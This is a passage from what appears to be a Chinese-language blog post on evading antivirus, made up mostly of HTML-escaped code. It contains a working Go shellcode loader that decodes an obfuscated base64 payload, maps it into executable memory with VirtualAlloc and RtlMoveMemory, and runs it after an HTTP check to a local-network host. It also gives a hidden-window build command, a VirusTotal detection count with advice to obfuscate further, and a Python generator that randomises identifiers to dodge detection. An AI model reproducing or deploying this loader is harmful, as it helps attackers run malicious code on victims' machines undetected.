&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">str1&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">strings&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ddm&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;#&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;A&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">str2&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">strings&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">str1&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;!&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;H&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">str3&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">strings&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">str2&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;@&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;1&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">str4&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">strings&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">str3&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;)&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;T&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">sDec&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">_&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">base64&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">StdEncoding&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">DecodeString&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">str4&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">addr&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">_&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">_&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">VirtualAlloc&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Call&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">uintptr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">sDec&lt;/span>&lt;span style="color:#111">)),&lt;/span> &lt;span style="color:#ae81ff">0x1000&lt;/span>&lt;span style="color:#111">|&lt;/span>&lt;span style="color:#ae81ff">0x2000&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">0x40&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">_&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">_&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">_&lt;/span> &lt;span style="color:#111">=&lt;/span> &lt;span style="color:#75af00">RtlMoveMemory&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Call&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">addr&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">uintptr&lt;/span>&lt;span style="color:#111">)(&lt;/span>&lt;span style="color:#75af00">unsafe&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Pointer&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">&amp;amp;&lt;/span>&lt;span style="color:#75af00">sDec&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">])),&lt;/span> &lt;span style="color:#111">uintptr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">sDec&lt;/span>&lt;span style="color:#111">)))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">syscall&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Syscall&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">addr&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">func&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">u&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">_&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Parse&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;http://192.168.31.29/pay&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">q&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">u&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Query&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">u&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">RawQuery&lt;/span> &lt;span style="color:#111">=&lt;/span> &lt;span style="color:#75af00">q&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Encode&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">err&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">http&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">u&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">String&lt;/span>&lt;span style="color:#111">())&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#75af00">err&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#00a8c8">nil&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">resCode&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">StatusCode&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Body&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Close&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#75af00">err&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#00a8c8">nil&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">y&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">=&lt;/span> &lt;span style="color:#ae81ff">200&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#75af00">resCode&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#75af00">y&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">build&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#75715e">// b64 payload here
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>go build -trimpath -ldflags&lt;span style="color:#f92672">=&lt;/span>-H&lt;span style="color:#f92672">=&lt;/span>windowsgui main.go
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>æŸ¥æ€ç»“æœæ˜¯&lt;a href="https://www.virustotal.com/gui/file/e35be096802a6f11ecc33722d47f872fe3aeb9612aec5b29ee04d099c0e46241">12/68&lt;/a>ï¼Œå¯ä»¥å†å¯¹goè„šæœ¬è¿›è¡Œæ··æ·†å¤„ç†&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">random&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#author: pureqh&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#github: https://github.com/pureqh/bypassAV&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#use: python build.py&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">exp&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&amp;#39;package main
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">import (
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> &amp;#34;encoding/base64&amp;#34;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> &amp;#34;strings&amp;#34;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> &amp;#34;syscall&amp;#34;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> &amp;#34;unsafe&amp;#34;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> &amp;#34;net/http&amp;#34;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> &amp;#34;net/url&amp;#34;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">var (
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> &lt;/span>&lt;span style="color:#d88200">{2}&lt;/span>&lt;span style="color:#d88200"> = syscall.NewLazyDLL(&amp;#34;kernel32.dll&amp;#34;)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> &lt;/span>&lt;span style="color:#d88200">{3}&lt;/span>&lt;span style="color:#d88200"> = &lt;/span>&lt;span style="color:#d88200">{2}&lt;/span>&lt;span style="color:#d88200">.NewProc(&amp;#34;VirtualAlloc&amp;#34;)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> &lt;/span>&lt;span style="color:#d88200">{4}&lt;/span>&lt;span style="color:#d88200"> = &lt;/span>&lt;span style="color:#d88200">{2}&lt;/span>&lt;span style="color:#d88200">.NewProc(&amp;#34;RtlMoveMemory&amp;#34;)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">func &lt;/span>&lt;span style="color:#d88200">{5}&lt;/span>&lt;span style="color:#d88200">(&lt;/span>&lt;span style="color:#d88200">{6}&lt;/span>&lt;span style="color:#d88200"> string)&lt;/span>&lt;span style="color:#d88200">{0}&lt;/span>&lt;span style="color:#d88200">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> &lt;/span>&lt;span style="color:#d88200">{7}&lt;/span>&lt;span style="color:#d88200"> :=strings.Replace(&lt;/span>&lt;span style="color:#d88200">{6}&lt;/span>&lt;span style="color:#d88200">, &amp;#34;#&amp;#34;, &amp;#34;A&amp;#34;, -1 )
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> &lt;/span>&lt;span style="color:#d88200">{8}&lt;/span>&lt;span style="color:#d88200"> :=strings.Replace(&lt;/span>&lt;span style="color:#d88200">{7}&lt;/span>&lt;span style="color:#d88200">, &amp;#34;!&amp;#34;, &amp;#34;H&amp;#34;, -1 )
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> &lt;/span>&lt;span style="color:#d88200">{9}&lt;/span>&lt;span style="color:#d88200"> :=strings.Replace(&lt;/span>&lt;span style="color:#d88200">{8}&lt;/span>&lt;span style="color:#d88200">, &amp;#34;@&amp;#34;, &amp;#34;1&amp;#34;, -1 )
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> &lt;/span>&lt;span style="color:#d88200">{10}&lt;/span>&lt;span style="color:#d88200"> :=strings.Replace(&lt;/span>&lt;span style="color:#d88200">{9}&lt;/span>&lt;span style="color:#d88200">, &amp;#34;)&amp;#34;, &amp;#34;T&amp;#34;, -1 )
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> &lt;/span>&lt;span style="color:#d88200">{11}&lt;/span>&lt;span style="color:#d88200">,_ := base64.StdEncoding.DecodeString(&lt;/span>&lt;span style="color:#d88200">{10}&lt;/span>&lt;span style="color:#d88200">)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> &lt;/span>&lt;span style="color:#d88200">{12}&lt;/span>&lt;span style="color:#d88200">, _, _ := &lt;/span>&lt;span style="color:#d88200">{3}&lt;/span>&lt;span style="color:#d88200">.Call(0, uintptr(len(&lt;/span>&lt;span style="color:#d88200">{11}&lt;/span>&lt;span style="color:#d88200">)), 0x1000|0x2000, 0x40)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> _, _, _ = &lt;/span>&lt;span style="color:#d88200">{4}&lt;/span>&lt;span style="color:#d88200">.Call(&lt;/span>&lt;span style="color:#d88200">{12}&lt;/span>&lt;span style="color:#d88200">, (uintptr)(unsafe.Pointer(&amp;amp;&lt;/span>&lt;span style="color:#d88200">{11}&lt;/span>&lt;span style="color:#d88200">[0])), uintptr(len(&lt;/span>&lt;span style="color:#d88200">{11}&lt;/span>&lt;span style="color:#d88200">)))
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> syscall.Syscall(&lt;/span>&lt;span style="color:#d88200">{12}&lt;/span>&lt;span style="color:#d88200">, 0, 0, 0, 0)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">&lt;/span>&lt;span style="color:#d88200">{1}&lt;/span>&lt;span style="color:#d88200">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">func main() &lt;/span>&lt;span style="color:#d88200">{0}&lt;/span>&lt;span style="color:#d88200">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> &lt;/span>&lt;span style="color:#d88200">{14}&lt;/span>&lt;span style="color:#d88200">, _ := url.Parse(&amp;#34;http://192.168.31.29/pay&amp;#34;)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> &lt;/span>&lt;span style="color:#d88200">{15}&lt;/span>&lt;span style="color:#d88200"> := &lt;/span>&lt;span style="color:#d88200">{14}&lt;/span>&lt;span style="color:#d88200">.Query()
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> &lt;/span>&lt;span style="color:#d88200">{14}&lt;/span>&lt;span style="color:#d88200">.RawQuery = &lt;/span>&lt;span style="color:#d88200">{15}&lt;/span>&lt;span style="color:#d88200">.Encode()
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> &lt;/span>&lt;span style="color:#d88200">{16}&lt;/span>&lt;span style="color:#d88200">, &lt;/span>&lt;span style="color:#d88200">{18}&lt;/span>&lt;span style="color:#d88200"> := http.Get(&lt;/span>&lt;span style="color:#d88200">{14}&lt;/span>&lt;span style="color:#d88200">.String())
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> if &lt;/span>&lt;span style="color:#d88200">{18}&lt;/span>&lt;span style="color:#d88200"> != nil &lt;/span>&lt;span style="color:#d88200">{0}&lt;/span>&lt;span style="color:#d88200">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> return
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> &lt;/span>&lt;span style="color:#d88200">{1}&lt;/span>&lt;span style="color:#d88200">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> &lt;/span>&lt;span style="color:#d88200">{13}&lt;/span>&lt;span style="color:#d88200"> := &lt;/span>&lt;span style="color:#d88200">{16}&lt;/span>&lt;span style="color:#d88200">.StatusCode
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> &lt;/span>&lt;span style="color:#d88200">{16}&lt;/span>&lt;span style="color:#d88200">.Body.Close()
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> if &lt;/span>&lt;span style="color:#d88200">{18}&lt;/span>&lt;span style="color:#d88200"> != nil &lt;/span>&lt;span style="color:#d88200">{0}&lt;/span>&lt;span style="color:#d88200">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> return
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> &lt;/span>&lt;span style="color:#d88200">{1}&lt;/span>&lt;span style="color:#d88200">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> var &lt;/span>&lt;span style="color:#d88200">{17}&lt;/span>&lt;span style="color:#d88200"> int = 200
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> if &lt;/span>&lt;span style="color:#d88200">{13}&lt;/span>&lt;span style="color:#d88200"> == &lt;/span>&lt;span style="color:#d88200">{17}&lt;/span>&lt;span style="color:#d88200"> &lt;/span>&lt;span style="color:#d88200">{0}&lt;/span>&lt;span style="color:#d88200">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> &lt;/span>&lt;span style="color:#d88200">{5}&lt;/span>&lt;span style="color:#d88200">(&amp;#34;&amp;#34;) // b64 payload here
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> &lt;/span>&lt;span style="color:#d88200">{1}&lt;/span>&lt;span style="color:#d88200">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">&lt;/span>&lt;span style="color:#d88200">{1}&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#39;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">random_name&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">str&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;ABCDEFGHIJKLMNOPQRSTUVWXYZ&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">join&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">random&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">sample&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">build_AV&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">lef&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&amp;#39;{&amp;#39;&amp;#39;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">rig&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&amp;#39;}&amp;#39;&amp;#39;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">var1&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">random_name&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">random&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">randint&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">3&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">9&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">var2&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">random_name&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">random&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">randint&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">3&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">9&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">var3&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">random_name&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">random&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">randint&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">3&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">9&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">fun1&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">random_name&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">random&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">randint&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">3&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">9&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">var4&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">random_name&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">random&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">randint&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">3&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">9&lt;/span>&lt;span style="color:#111">))&lt;/span>
